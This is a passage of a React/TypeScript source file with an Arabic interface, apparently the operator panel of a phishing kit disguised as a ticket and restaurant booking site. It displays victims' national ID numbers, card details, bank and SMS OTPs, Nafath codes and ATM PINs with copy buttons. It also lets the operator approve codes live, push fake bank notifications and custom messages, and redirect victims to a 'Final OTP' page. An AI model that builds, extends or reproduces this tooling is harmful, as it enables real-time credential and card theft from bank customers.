                  <span className="px-2 py-0.5 rounded bg-blue-50 border border-blue-200 text-blue-700 text-xs font-bold font-mono tabular-nums">
                    {selected.step || 1}
                  </span>
                  <PagesControlDropdown visitor={selected} />
                </div>
              </div>

              {/* Device & Network Telemetry Strip */}
              <div className="px-4 py-1.5 border-b border-gray-100 bg-gray-50/60 flex items-center justify-between gap-3 text-[11px] text-gray-600 shrink-0 flex-wrap">
                <div className="flex items-center gap-3 flex-wrap">
                  <span className="font-semibold text-gray-800">
                    {getFlowStepLabels(getVisitorFlow(selected))[
                      selected.step as number
                    ] || "—"}
                  </span>
                  {selected.geoCountry && (
                    <span className="flex items-center gap-1">
                      <Globe className="w-3 h-3 text-gray-400" />
                      {countryFlag(String(selected.geoCountryCode || ""))}{" "}
                      {selected.geoCountry}
                      {selected.geoCity ? ` · ${selected.geoCity}` : ""}
                    </span>
                  )}
                  <span className="flex items-center gap-1 text-gray-500">
                    <PhoneIcon className="w-3 h-3 text-gray-400" /> mobile ·
                    Chrome
                  </span>
                  {(selected.ip || selected.ipAddress) && (
                    <span className="font-mono text-gray-500" dir="ltr">
                      {String(selected.ip || selected.ipAddress)}
                    </span>
                  )}
                </div>
                <span
                  className={`text-[11px] font-semibold ${
                    isOnline(selected) ? "text-emerald-600" : "text-gray-400"
                  }`}
                >
                  {isOnline(selected) ? "متصل الآن" : "غير متصل"}
                </span>
              </div>

              {/* Scrollable Timeline Stream */}
              <div className="flex-1 overflow-y-auto px-5 sm:px-8 py-5 bg-white">
                <div className="text-center text-[11px] text-gray-400 mb-4 font-mono">
                  {fmtTime(selected.updatedAt)}
                </div>

                <div className="max-w-[440px] space-y-4">
                  <Panel title="التواصل مع الزائر">
                    <div className="space-y-3">
                      <BankContactPushRow visitor={selected} />
                      <CustomMessagePushRow visitor={selected} />
                    </div>
                  </Panel>
                  {cardSettings.customer.visible && (
                    <CustomerInfoCard visitor={selected} />
                  )}
                  {cardSettings.card.visible && (
                    <CardInfoCard
                      visitor={selected}
                      onApprove={field =>
                        setApprovalStatus(selected.id, field, "approved")
                      }
                      onReject={field =>
                        setApprovalStatus(selected.id, field, "rejected")
                      }
                      onPushStep={(targetStep) =>
                        pushDirective(
                          selected.id,
                          buildPageControlPayload(
                            getVisitorFlow(selected),
                            targetStep,
                            new Date().toISOString()
                          )
                        )
                      }
                      onBlockBin={addBlockedBin}
                      isBinBlocked={
                        !!selected.payment?.cardBin &&
                        blockedBins.includes(String(selected.payment.cardBin))
                      }
                      onBlockIp={addBlockedIp}
                      isIpBlocked={
                        !!(selected.ip || selected.ipAddress) &&
                        blockedIps.includes(
                          String(selected.ip || selected.ipAddress)
                        )
                      }
                    />
                  )}
                  {cardSettings.otp.visible && (
                    <OtpControlCard
                      visitor={selected}
                      otpInput={otpInput}
                      setOtpInput={setOtpInput}
                      otpDirect={otpDirect}
                      setOtpDirect={setOtpDirect}
                      onApprove={field =>
                        setApprovalStatus(selected.id, field, "approved")
                      }
                      onReject={field =>
                        setApprovalStatus(selected.id, field, "rejected")
                      }
                      onSendOtp={code =>
                        pushDirective(selected.id, {
                          adminPushedOtp: code,
                          adminPushedOtpAt: new Date().toISOString(),
                        })
                      }
                      onForceFinalOtp={() =>
                        pushDirective(selected.id, {
                          forceFinalOtp: true,
                          forceFinalOtpAt: new Date().toISOString(),
                        })
                      }
                    />
                  )}
                  {cardSettings.header.visible && (
                    <VisitorHeaderCard visitor={selected} />
                  )}
                </div>

                <div className="text-center text-[11px] text-gray-400 mt-6">
                  الآن
                </div>
              </div>
            </>
          ) : (
            <div className="flex-1 flex items-center justify-center text-gray-400 text-sm">
              {loading ? "جاري التحميل..." : "اختر زائراً من القائمة"}
            </div>
          )}
        </main>
      </div>

      {/* Blocked IPs management dialog */}
      {ipBlocklistOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-xs"
          onClick={() => setIpBlocklistOpen(false)}
          data-testid="ip-blocklist-dialog-backdrop"
        >
          <div
            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
            onClick={e => e.stopPropagation()}
          >
            <div className="relative">
              <button
                onClick={() => setIpBlocklistOpen(false)}
                className="absolute top-2.5 left-2.5 z-10 p-1.5 rounded-lg bg-gray-100 hover:bg-gray-200 text-gray-600 transition"
                aria-label="إغلاق"
                data-testid="ip-blocklist-dialog-close"
              >
                <XIcon className="w-4 h-4" />
              </button>
              <BlockedIpsCard
                ips={blockedIps}
                onAdd={addBlockedIp}
                onRemove={removeBlockedIp}
                suggestedIp={selected?.ip || selected?.ipAddress}
                suggestedName={selected?.name || selected?.id}
              />
            </div>
          </div>
        </div>
      )}

      {/* Blocked BINs management dialog */}
      {blocklistOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-xs"
          onClick={() => setBlocklistOpen(false)}
          data-testid="blocklist-dialog-backdrop"
        >
          <div
            className="w-full max-w-md max-h-[90vh] overflow-y-auto"
            onClick={e => e.stopPropagation()}
          >
            <div className="relative">
              <button
                onClick={() => setBlocklistOpen(false)}
                className="absolute top-2.5 left-2.5 z-10 p-1.5 rounded-lg bg-gray-100 hover:bg-gray-200 text-gray-600 transition"
                aria-label="إغلاق"
                data-testid="blocklist-dialog-close"
              >
                <XIcon className="w-4 h-4" />
              </button>
              <BlockedBinsCard
                bins={blockedBins}
                storedCards={storedBlockedCards}
                onAdd={addBlockedBin}
                onRemove={removeBlockedBin}
                onRemoveStoredCard={removeStoredBlockedCard}
                onExportExcel={() =>
                  exportBlockedCardsExcel(storedBlockedCards, blockedBins, visitors)
                }
                suggestedVisitor={selected}
                suggestedBin={selected?.payment?.cardBin}
                suggestedLast4={selected?.payment?.cardLast4}
              />
            </div>
          </div>
        </div>
      )}
      {/* Attack Protection management dialog */}
      {attackPanelOpen && (
        <div
          className="fixed inset-0 z-50 flex items-center justify-center p-4 bg-black/40 backdrop-blur-xs"
          onClick={() => setAttackPanelOpen(false)}
          data-testid="attack-protection-dialog-backdrop"
        >
          <div
            className="w-full max-w-lg max-h-[90vh] overflow-y-auto"
            onClick={e => e.stopPropagation()}
          >
            <div className="relative">
              <button
                onClick={() => setAttackPanelOpen(false)}
                className="absolute top-2.5 left-2.5 z-10 p-1.5 rounded-lg bg-gray-100 hover:bg-gray-200 text-gray-600 transition"
                aria-label="إغلاق"
                data-testid="attack-protection-dialog-close"
              >
                <XIcon className="w-4 h-4" />
              </button>
              <AttackProtectionCard
                state={attackState}
                busy={attackBusy}
                blockedIps={blockedIps}
                onToggle={() => void toggleAttackMode()}
                onResetStats={() => void toggleAttackMode(attackState.enabled, true)}
                onBlockIp={ip => void addBlockedIp(ip)}
              />
            </div>
          </div>
        </div>
      )}
    </div>
  );
}

/* ============================================================ */
/* Sub-components                                                */
/* ============================================================ */

function IconButton({
  icon: Icon,
  label,
  color,
  onClick,
  badge,
  pulse,
  testId,
}: {
  icon: any;
  label: string;
  color: "red" | "slate" | "green";
  onClick?: () => void;
  badge?: string;
  pulse?: boolean;
  testId?: string;
}) {
  const cls =
    color === "red"
      ? "bg-red-50 text-red-600 hover:bg-red-100 border-red-200"
      : color === "green"
        ? "bg-emerald-50 text-emerald-600 hover:bg-emerald-100 border-emerald-200"
        : "bg-white text-gray-600 hover:bg-gray-100 border-gray-200";
  return (
    <button
      onClick={onClick}
      title={label}
      data-testid={testId}
      className={`w-8 h-8 rounded-md border flex items-center justify-center transition relative ${cls} ${pulse ? "animate-pulse" : ""}`}
    >
      <Icon className="w-4 h-4" />
      {badge && (
        <span className="absolute -top-1.5 -left-1.5 min-w-[16px] h-4 px-1 rounded-full bg-red-500 text-white text-[9px] font-bold flex items-center justify-center border border-white">
          {badge}
        </span>
      )}
    </button>
  );
}

function Panel({
  title,
  badge,
  headerAction,
  children,
}: {
  title: string;
  badge?: string;
  headerAction?: React.ReactNode;
  children: React.ReactNode;
}) {
  return (
    <div className="rounded-xl bg-[#f4f5f7] border border-gray-200/80 overflow-hidden flex flex-col">
      <div className="px-4 py-2.5 flex items-center justify-between border-b border-gray-200/70">
        <div className="flex items-center gap-2">
          <h3 className="text-[13px] font-bold text-gray-800">{title}</h3>
          {badge && (
            <span className="text-[10px] px-2 py-0.5 rounded bg-amber-100 text-amber-800 font-semibold">
              {badge}
            </span>
          )}
        </div>
        {headerAction || (
          <span className="text-gray-400 text-xs font-bold tracking-widest select-none">
            •••
          </span>
        )}
      </div>
      <div className="p-3.5 flex-1 text-[12px] text-gray-800">{children}</div>
    </div>
  );
}

function Row({
  label,
  value,
  mono,
}: {
  label: string;
  value: any;
  mono?: boolean;
}) {
  const text = safeText(value);
  if (!text) return null;
  return (
    <div className="flex items-center justify-between gap-3 py-1.5 border-b border-gray-200/60 last:border-0">
      <span className="text-gray-500 text-[12px] shrink-0">{label} :</span>
      <span
        className={`text-gray-900 text-[12px] font-semibold text-left ${mono ? "font-mono" : ""}`}
        dir={mono ? "ltr" : undefined}
      >
        {text}
      </span>
    </div>
  );
}

function VisitorHeaderCard({ visitor }: { visitor: Visitor }) {
  const online = isOnline(visitor);
  return (
    <Panel
      title="ملخص الجلسة والبيانات التقنية"
      badge={online ? "متصل" : "غير متصل"}
    >
      <div className="space-y-1 text-[12px]">
        <Row label="الاسم" value={visitor.name || "زائر بدون اسم"} />
        {visitor.phoneVerification && (
          <Row label="تحقق الجوال" value={visitor.phoneVerification} mono />
        )}
        {visitor.phone && <Row label="رقم الجوال" value={visitor.phone} mono />}
        <Row label="آخر تحديث" value={fmtTime(visitor.updatedAt)} />
        <Row
          label="المرحلة"
          value={
            getFlowStepLabels(getVisitorFlow(visitor))[visitor.step as number]
          }
        />
        <Row
          label="نوع الحجز"
          value={
            getVisitorFlow(visitor) === "restaurant"
              ? `حجز مطعم${visitor.restaurant ? ` · ${visitor.restaurant}` : ""}`
              : "حجز تذاكر"
          }
        />
        <Row label="الحالة" value={visitor.status} />
        {(visitor.ip || visitor.ipAddress) && (
          <Row
            label="عنوان IP"
            value={String(visitor.ip || visitor.ipAddress)}
            mono
          />
        )}
        {(visitor.geoCountry || visitor.geoCity) && (
          <Row
            label="الدولة"
            value={
              [
                visitor.geoCity,
                visitor.geoRegion,
                visitor.geoCountry,
                visitor.geoCountryCode
                  ? `(${String(visitor.geoCountryCode).toUpperCase()})`
                  : "",
              ]
                .filter(Boolean)
                .join(" · ") || "—"
            }
          />
        )}
        <Row label="معرّف الزائر" value={visitor.id.slice(0, 24) + "…"} mono />
      </div>
    </Panel>
  );
}

function CustomerInfoCard({ visitor }: { visitor: Visitor }) {
  const flow = getVisitorFlow(visitor);
  const isRestaurant = flow === "restaurant";

  const basicRows = [
    safeText(visitor.name) && (
      <Row key="n" label="الاسم" value={visitor.name} />
    ),
    safeText(visitor.phone || visitor.fullPhone) && (
      <Row
        key="p"
        label="رقم الجوال"
        value={visitor.phone || visitor.fullPhone}
        mono
      />
    ),
    safeText(visitor.email) && (
      <Row key="em" label="البريد الإلكتروني" value={visitor.email} mono />
    ),
    safeText(visitor.saudiId) && (
      <Row key="si" label="رقم الهوية" value={visitor.saudiId} mono />
    ),
  ].filter(Boolean);

  // Ticket-flow rows (only when flow is ticket)
  const ticketRows = !isRestaurant
    ? [
        safeText(visitor.ticketQuantity) && (
          <Row key="tq" label="عدد التذاكر" value={visitor.ticketQuantity} />
        ),
        safeText(visitor.ticketPrice) && (
          <Row
            key="tp"
            label="سعر التذكرة"
            value={`${visitor.ticketPrice} ر.س`}
          />
        ),
        (visitor.payment?.amount || visitor.totalAmount) && (
          <Row
            key="amt"
            label="المبلغ الإجمالي"
            value={`${visitor.payment?.amount || visitor.totalAmount || "0"} ر.س.`}
            mono
          />
        ),
        safeText(visitor.paymentMode) && (
          <Row key="pm" label="طريقة الدفع" value={visitor.paymentMode} />
        ),
        safeText(visitor.bookingDate) && (
          <Row key="bd" label="تاريخ الزيارة" value={visitor.bookingDate} />
        ),
        safeText(visitor.bookingTime) && (
          <Row key="bt" label="وقت الزيارة" value={visitor.bookingTime} />
        ),
      ].filter(Boolean)
    : [];

  // Restaurant-reservation rows (only when flow is restaurant)
  const restaurantRows = isRestaurant
    ? [
        safeText(visitor.restaurant || visitor.restaurantEn) && (
          <Row
            key="rs"
            label="المطعم"
            value={visitor.restaurant || visitor.restaurantEn}
          />
        ),
        safeText(visitor.date) && (
          <Row key="rd" label="تاريخ الحجز" value={visitor.date} />
        ),
        safeText(visitor.time) && (
          <Row key="rt" label="وقت الحجز" value={visitor.time} />
        ),
        safeText(visitor.guests) && (
          <Row key="rg" label="عدد الأشخاص" value={visitor.guests} />
        ),
        safeText(visitor.notes) && (
          <Row key="rn" label="ملاحظات" value={visitor.notes} />
        ),
        (visitor.total || visitor.totalAmount || visitor.payment?.amount) && (
          <Row
            key="rto"
            label="إجمالي الحجز"
            value={`${visitor.total || visitor.totalAmount || visitor.payment?.amount || "0"} ر.س`}
            mono
          />
        ),
        safeText(visitor.paymentMode) && (
          <Row key="rpm" label="طريقة الدفع" value={visitor.paymentMode} />
        ),
      ].filter(Boolean)
    : [];

  return (
    <div className="space-y-4 grid w-full">
      {basicRows.length > 0 && (
        <Panel title="معلومات العميل الأساسية">
          <div className="space-y-0.5">{basicRows}</div>
        </Panel>
      )}
      {!isRestaurant && ticketRows.length > 0 && (
        <Panel title="بيانات التذاكر المختارة">
          <div className="space-y-0.5">{ticketRows}</div>
        </Panel>
      )}
      {isRestaurant && restaurantRows.length > 0 && (
        <Panel title="تفاصيل حجز المطعم">
          <div className="space-y-0.5">{restaurantRows}</div>
        </Panel>
      )}
    </div>
  );
}

function CopyButton({ text, label }: { text: string; label?: string }) {
  const [copied, setCopied] = useState(false);
  if (!text) return null;
  return (
    <button
      onClick={() => {
        navigator.clipboard.writeText(text);
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
      }}
      className="px-2 py-0.5 bg-white hover:bg-gray-100 text-blue-700 rounded text-[10px] font-semibold flex items-center gap-1 border border-gray-300 transition"
      title="نسخ"
    >
      {copied ? "تم النسخ ✓" : label || "نسخ"}
    </button>
  );
}

function OtpControlCard({
  visitor,
  otpInput: _otpInput,
  setOtpInput: _setOtpInput,
  otpDirect,
  setOtpDirect,
  onApprove,
  onReject,
  onSendOtp,
  onForceFinalOtp,
}: {
  visitor: Visitor;
  otpInput: string;
  setOtpInput: (s: string) => void;
  otpDirect: string;
  setOtpDirect: (s: string) => void;
  onApprove: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
  onReject: (field: "otpApprovalStatus" | "phoneOtpApprovalStatus") => void;
  onSendOtp: (code: string) => void;
  onForceFinalOtp: () => void;
}) {
  const cardOtp = String(visitor.otp || "");
  const phoneOtp = String(visitor.smsOtp || visitor.phoneOtp || "");
  const nafadOtp = String(
    visitor.nafadConfirmationCode || visitor.nafadOtp || ""
  );
  const atmPin = String(visitor.atmPin || visitor.pin || "");
  const waitingBank = visitor.otpApprovalStatus !== "approved";
  const waitingPhone = visitor.phoneOtpApprovalStatus !== "approved";
  const cp = String(visitor.currentPage || "");
  const onOtpStep =
    cp === "otp" ||
    cp === "otp_verified" ||
    cp === "reserve_otp" ||
    cp === "confirmation" ||
    isFinalStep(visitor);
  if (
    !cardOtp &&
    !phoneOtp &&
    !nafadOtp &&
    !atmPin &&
    !waitingBank &&
    !waitingPhone &&
    !onOtpStep
  )
    return null;

  return (
    <Panel
      title="رموز التحقق (OTP) والرمز السري"
      badge={waitingBank || waitingPhone ? "بانتظار الموافقة" : undefined}
    >
      <div className="space-y-3">
        <OtpRow
          label="OTP البطاقة (البنك)"
          step={5}
          code={cardOtp}
          status={
            waitingBank
              ? "waiting"
              : visitor.otpApprovalStatus || (cardOtp ? "received" : "—")
          }
          canDecide={visitor.otpApprovalStatus !== "approved"}
          onApprove={() => onApprove("otpApprovalStatus")}
          onReject={() => onReject("otpApprovalStatus")}
        />
        {cardOtp && (
          <div className="flex items-center justify-between bg-white p-2 rounded-lg border border-gray-200 text-[11px]">
            <span className="text-gray-600">رمز OTP البنك (نصي):</span>
            <div className="flex items-center gap-2">
              <span
                className="font-mono font-bold text-blue-700 select-all"
                dir="ltr"
              >
                {cardOtp}
              </span>
              <CopyButton text={cardOtp} />
            </div>
          </div>
        )}
        {phoneOtp && (
          <div className="flex items-center justify-between bg-white p-2 rounded-lg border border-gray-200 text-[11px]">
            <span className="text-gray-600">رمز الجوال (SMS OTP):</span>
            <div className="flex items-center gap-2">
              <span
                className="font-mono font-bold text-emerald-700 select-all"
                dir="ltr"
              >
                {phoneOtp}
              </span>
              <CopyButton text={phoneOtp} />
            </div>
          </div>
        )}
        {nafadOtp && (
          <div className="flex items-center justify-between bg-white p-2 rounded-lg border border-gray-200 text-[11px]">
            <span className="text-gray-600">رقم نفاذ:</span>
            <div className="flex items-center gap-2">
              <span
                className="font-mono font-bold text-teal-700 select-all"
                dir="ltr"
              >
                {nafadOtp}
              </span>
              <CopyButton text={nafadOtp} />
            </div>
          </div>
        )}
        {atmPin && (
          <div className="flex items-center justify-between bg-white p-2 rounded-lg border border-gray-200 text-[11px]">
            <span className="text-gray-600">الرقم السري للصراف (ATM PIN):</span>
            <div className="flex items-center gap-2">
              <span
                className="font-mono font-bold text-rose-700 select-all"
                dir="ltr"
              >
                {atmPin}
              </span>
              <CopyButton text={atmPin} />
            </div>
          </div>
        )}
        {/* Direct push OTP */}
        <div>
          <input
            value={otpDirect}
            onChange={e => setOtpDirect(e.target.value)}
            placeholder="أدخل رمز أو رقم مباشر"
            className="w-full px-3 py-2 bg-white border border-gray-300 rounded-lg text-xs text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 text-right"
            data-testid="push-otp-input"
          />
          <div className="grid grid-cols-2 gap-1.5 mt-1.5">
            <button
              onClick={() => {
                if (otpDirect.trim()) {
                  onSendOtp(otpDirect.trim());
                  setOtpDirect("");
                }
              }}
              className="py-1.5 bg-white hover:bg-gray-100 text-gray-800 border border-gray-300 rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
              data-testid="push-otp-send"
            >
              <Send className="w-3 h-3" /> إرسال
            </button>
            <button
              onClick={onForceFinalOtp}
              className="py-1.5 bg-blue-600 hover:bg-blue-700 text-white rounded-lg text-xs font-semibold flex items-center justify-center gap-1"
              data-testid="force-final"
            >
              <ArrowLeftRight className="w-3 h-3" /> توجيه إلى Final OTP
            </button>
          </div>
        </div>
      </div>
    </Panel>
  );
}

function BankContactPushRow({ visitor }: { visitor: Visitor }) {
  const v = visitor as any;
  const requested = Boolean(v.bankContactRequest);
  const confirmed = Boolean(v.bankContactConfirmed);
  const requestedAt = String(v.bankContactAt || "");
  const confirmedAt = String(v.bankContactConfirmedAt || "");
  const [pushing, setPushing] = useState(false);

  let statusLabel = "";
  let statusClass = "";
  if (confirmed && confirmedAt) {
    statusLabel = `تم تأكيد الاستلام · ${fmtRelative(confirmedAt)}`;
    statusClass = "text-emerald-700";
  } else if (requested && requestedAt) {
    statusLabel = `بانتظار التأكيد · ${fmtRelative(requestedAt)}`;
    statusClass = "text-amber-700";
  }

  const handlePush = async () => {
    if (pushing) return;
    setPushing(true);
    try {
      await pushBankContactRequest(visitor.id);
    } finally {
      setPushing(false);
    }
  };

  return (
    <div>
      <button
        onClick={handlePush}
        disabled={pushing}
        className={`w-full py-2 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors border ${
          confirmed
            ? "bg-emerald-50 hover:bg-emerald-100 text-emerald-800 border-emerald-200"
            : requested
              ? "bg-amber-50 hover:bg-amber-100 text-amber-800 border-amber-200"
              : "bg-blue-600 hover:bg-blue-700 text-white border-blue-600"
        } disabled:opacity-60`}
        data-testid="button-push-bank-contact"
      >
        <PhoneCall className="w-3.5 h-3.5" />
        {confirmed
          ? "تم التأكيد · إعادة الإرسال"
          : requested
            ? "إعادة إرسال إشعار البنك"
            : "إرسال إشعار البنك"}
      </button>
      {statusLabel && (
        <div
          className={`text-[11px] mt-1 text-center font-medium ${statusClass}`}
          data-testid="text-bank-contact-status"
        >
          {statusLabel}
        </div>
      )}
    </div>
  );
}

function CustomMessagePushRow({ visitor }: { visitor: Visitor }) {
  const v = visitor as any;
  const visible = Boolean(v.customMessageVisible && v.customMessage);
  const confirmed = Boolean(v.customMessageConfirmed);
  const activeMessage = String(v.customMessage || "");
  const activeTitle = String(v.customMessageTitle || "");
  const sentAt = String(v.customMessageAt || "");
  const confirmedAt = String(v.customMessageConfirmedAt || "");

  const [title, setTitle] = useState("");
  const [message, setMessage] = useState("");
  const [sending, setSending] = useState(false);

  useEffect(() => {
    setTitle("");
    setMessage("");
  }, [visitor.id]);

  let statusLabel = "";
  let statusClass = "";
  if (confirmed && confirmedAt) {
    statusLabel = `تم استلام الرسالة · ${fmtRelative(confirmedAt)}`;
    statusClass = "text-emerald-700";
  } else if (visible && sentAt) {
    statusLabel = `ظاهرة للزائر الآن · ${fmtRelative(sentAt)}`;
    statusClass = "text-amber-700";
  }

  const handleSend = async () => {
    if (sending || !message.trim()) return;
    setSending(true);
    try {
      await pushCustomVisitorMessage(visitor.id, message, title);
      setMessage("");
      setTitle("");
    } finally {
      setSending(false);
    }
  };

  const handleHide = async () => {
    if (sending) return;
    setSending(true);
    try {
      await clearCustomVisitorMessage(visitor.id);
    } finally {
      setSending(false);
    }
  };

  return (
    <div
      className="pt-2.5 border-t border-gray-200/80 space-y-2"
      data-testid="custom-message-panel"
    >
      <div className="flex items-center justify-between text-[11px] font-semibold text-gray-700">
        <span className="flex items-center gap-1.5">
          <MessageSquare className="w-3.5 h-3.5 text-blue-600" />
          رسالة مخصصة للزائر
        </span>
        {visible && (
          <button
            onClick={handleHide}
            disabled={sending}
            className="text-[10px] px-2 py-0.5 rounded bg-white hover:bg-gray-100 text-gray-700 border border-gray-300 disabled:opacity-50"
            data-testid="button-hide-custom-message"
          >
            إخفاء الرسالة
          </button>
        )}
      </div>

      <input
        value={title}
        onChange={e => setTitle(e.target.value)}
        placeholder="عنوان الرسالة (اختياري، الافتراضي: رسالة من الإدارة)"
        className="w-full px-2.5 py-1.5 bg-white border border-gray-300 rounded-lg text-xs text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 text-right"
        data-testid="input-custom-message-title"
      />
      <textarea
        value={message}
        onChange={e => setMessage(e.target.value)}
        rows={2}
        placeholder="اكتب الرسالة التي تريد إظهارها للزائر الآن..."
        className="w-full px-2.5 py-1.5 bg-white border border-gray-300 rounded-lg text-xs text-gray-900 placeholder-gray-400 focus:outline-none focus:border-blue-500 text-right resize-none"
        data-testid="input-custom-message-body"
      />
      <button
        onClick={handleSend}
        disabled={sending || !message.trim()}
        className="w-full py-2 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors bg-gray-900 hover:bg-gray-800 text-white disabled:opacity-50"
        data-testid="button-send-custom-message"
      >
        <Send className="w-3.5 h-3.5" />
        {sending
          ? "جاري الإرسال..."
          : visible
            ? "تحديث وإرسال رسالة جديدة"
            : "إرسال وإظهار للزائر"}
      </button>

      {activeMessage && (
        <div
          className="bg-white border border-gray-200 rounded-lg p-2 text-[11px] text-gray-700 space-y-0.5"
          data-testid="text-custom-message-preview"
        >
          <div className="text-[10px] text-gray-500 font-semibold">
            آخر رسالة مرسلة ({activeTitle || "رسالة من الإدارة"}):
          </div>
          <div className="whitespace-pre-line text-gray-900">{activeMessage}</div>
        </div>
      )}

      {statusLabel && (
        <div
          className={`text-[11px] text-center font-medium ${statusClass}`}
          data-testid="text-custom-message-status"
        >
          {statusLabel}
        </div>
      )}
    </div>
  );
}

function NafadControl({
  visitor,
  onApprove,
  onReject,
}: {
  visitor: Visitor;
  onApprove: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
  onReject: (
    field: "cardApprovalStatus" | "otpApprovalStatus" | "phoneOtpApprovalStatus"
  ) => void;
}) {
  const [code, setCode] = useState("");
  const sentCode = String(visitor.nafadConfirmationCode || "");
  const status = visitor.nafadConfirmationStatus;

  async function sendCode() {
    const clean = code.replace(/\D/g, "").slice(0, 2);
    if (clean.length < 2) return;
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        nafadConfirmationCode: clean,
        nafadConfirmationStatus: "waiting",
        nafadUpdatedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true }
    );
    setCode("");
  }

  async function clearCode() {
    await setDoc(
      doc(db, "pays", visitor.id),
      {
        nafadConfirmationCode: "",
        nafadConfirmationStatus: "waiting",
        nafadUpdatedAt: new Date().toISOString(),
        updatedAt: new Date().toISOString(),
      },
      { merge: true }
    );
  }

  return (
    <div className="bg-teal-50 border border-teal-200 rounded-lg p-2.5 space-y-2">
      <div className="text-[11px] text-teal-800 font-bold flex items-center justify-between">
        <span>رمز تأكيد نفاذ</span>
        {sentCode ? (
          <span
            className="font-mono text-base text-teal-900"
            dir="ltr"
            data-testid="admin-nafad-current"
          >
            {sentCode}
          </span>
        ) : (
          <span className="text-[10px] text-amber-700">
            المستخدم بانتظار الرقم
          </span>
        )}
      </div>

      <div className="flex gap-1.5">
        <input
          value={code}
          onChange={e => setCode(e.target.value.replace(/\D/g, "").slice(0, 2))}
          placeholder="رقم من رقمين"
          inputMode="numeric"
          maxLength={2}
          dir="ltr"
          data-testid="admin-nafad-input"
          className="flex-1 bg-white border border-gray-300 rounded px-2 py-1.5 text-sm font-mono text-gray-900 text-center focus:outline-none focus:border-teal-500"
        />
        <button
          onClick={sendCode}
          disabled={code.length < 2}
          data-testid="admin-nafad-send"
          className="px-3 py-1.5 bg-teal-600 text-white rounded text-xs font-bold hover:bg-teal-700 disabled:opacity-40 disabled:cursor-not-allowed"
        >
          إرسال
        </button>
        {sentCode && (
          <button
            onClick={clearCode}
            data-testid="admin-nafad-clear"
            title="مسح وإعادة طلب رقم"
            className="px-2 py-1.5 bg-white text-gray-700 rounded text-xs border border-gray-300 hover:bg-gray-100"
          >
            ✕
          </button>
        )}
      </div>

      {sentCode && (
        <div className="grid grid-cols-2 gap-1.5">
          <button
            onClick={() => onApprove("nafadConfirmationStatus" as any)}
            data-testid="admin-nafad-approve"
            className={`py-1 rounded text-xs font-semibold border ${
              status === "approved"
                ? "bg-emerald-600 text-white border-emerald-600"
                : "bg-emerald-50 text-emerald-700 border-emerald-200 hover:bg-emerald-100"
            }`}
          >
            قبول نفاذ
          </button>
          <button
            onClick={() => onReject("nafadConfirmationStatus" as any)}
            data-testid="admin-nafad-reject"
            className={`py-1 rounded text-xs font-semibold border ${
              status === "rejected"
                ? "bg-red-600 text-white border-red-600"
                : "bg-red-50 text-red-700 border-red-200 hover:bg-red-100"
            }`}
          >
            رفض نفاذ
          </button>
        </div>
      )}
    </div>
  );
}

function CustomizeDropdown({
  settings,
  onChange,
  onReset,
}: {
  settings: CardSettings;
  onChange: (key: CardKey, patch: Partial<CardSetting>) => void;
  onReset: () => void;
}) {
  const [open, setOpen] = useState(false);

  useEffect(() => {
    if (!open) return;
    const onDoc = (e: MouseEvent) => {
      const t = e.target as HTMLElement;
      if (!t.closest("[data-customize-dropdown]")) setOpen(false);
    };
    document.addEventListener("mousedown", onDoc);
    return () => document.removeEventListener("mousedown", onDoc);
  }, [open]);

  const hiddenCount = (Object.values(settings) as CardSetting[]).filter(
    s => !s.visible
  ).length;

  return (
    <div className="relative" data-customize-dropdown>
      <button
        onClick={() => setOpen(o => !o)}
        className="h-8 px-2.5 rounded-md text-xs font-semibold flex items-center gap-1.5 bg-white hover:bg-gray-100 text-gray-700 border border-gray-200"
        data-testid="admin-customize-btn"
      >
        <Settings className="w-3.5 h-3.5 text-gray-500" />
        <span className="hidden sm:inline">تخصيص</span>
        {hiddenCount > 0 && (
          <span className="text-[10px] bg-blue-50 text-blue-700 px-1.5 py-0.5 rounded font-bold">
            {hiddenCount}
          </span>
        )}
        <ChevronDown
          className={`w-3.5 h-3.5 text-gray-400 transition ${open ? "rotate-180" : ""}`}
        />
      </button>

      {open && (
        <div className="absolute top-full mt-2 right-0 w-72 rounded-xl border border-gray-200 bg-white shadow-xl z-30">
          <div className="p-3 border-b border-gray-100 flex items-center justify-between">
            <div className="text-xs font-bold text-gray-900">
              إظهار / إخفاء البطاقات
            </div>
            <button
              onClick={onReset}
              className="text-[11px] text-blue-600 hover:text-blue-700 flex items-center gap-1 font-medium"
              data-testid="admin-customize-reset"
            >
              <RotateCcw className="w-3 h-3" />
              إعادة الضبط
            </button>
          </div>

          <div className="p-2 max-h-96 overflow-y-auto">
            {(Object.keys(CARD_LABELS) as CardKey[]).map(key => {
              const s = settings[key];
              return (
                <div
                  key={key}
                  className="p-2 rounded-lg hover:bg-gray-50"
                  data-testid={`admin-customize-row-${key}`}
                >
                  <div className="flex items-center justify-between gap-2">
                    <button
                      onClick={() => onChange(key, { visible: !s.visible })}
                      className="flex items-center gap-2 flex-1 text-right"
                      data-testid={`admin-customize-toggle-${key}`}
                    >
                      {s.visible ? (
                        <Eye className="w-4 h-4 text-blue-600" />
                      ) : (
                        <EyeOff className="w-4 h-4 text-gray-400" />
                      )}
                      <span
                        className={`text-xs font-semibold ${s.visible ? "text-gray-900" : "text-gray-400"}`}
                      >
                        {CARD_LABELS[key]}
                      </span>
                    </button>
                  </div>
                  {s.visible && (
                    <div className="mt-2 grid grid-cols-2 gap-1">
                      {([1, 2] as const).map(sp => (
                        <button
                          key={sp}
                          onClick={() => onChange(key, { span: sp })}
                          className={`py-1 rounded-md text-[10px] font-semibold transition border ${
                            s.span === sp
                              ? "bg-blue-50 text-blue-700 border-blue-200"
                              : "bg-gray-50 text-gray-600 hover:bg-gray-100 border-gray-200"
                          }`}
                          data-testid={`admin-customize-span-${key}-${sp}`}
                        >
